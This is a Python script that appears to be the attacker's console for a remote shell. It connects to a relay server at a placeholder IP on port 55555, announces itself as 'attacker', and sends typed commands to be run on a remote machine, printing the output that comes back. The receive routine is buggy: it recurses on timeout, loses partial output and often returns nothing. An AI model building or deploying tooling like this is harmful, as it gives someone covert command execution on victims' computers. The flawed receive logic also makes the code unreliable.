import socket
import os

IP = "SERVER IP"
PORT = 55555
addr = (IP, PORT)

attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker.connect(addr)
attacker.send("A".encode("ascii"))
attacker.settimeout(2)

def recive():
	full_output = ""
	try:
		while True:
			print("1")
			output = attacker.recv(1024)
			output = output.decode("ascii")
			if output == "":
				pass
			else:
				print(len(output.encode("utf-8")))
				if len(output.encode("utf-8")) == 1024:
					full_output = full_output + output
				else:
					print("Returning")
					return full_output
					break
	except:
		recive()

def handle():
	while True:
		command = input("Command: ")
		attacker.send(command.encode("ascii"))
		print("Trying to recv")
		output = recive()
		print(output)

handle()
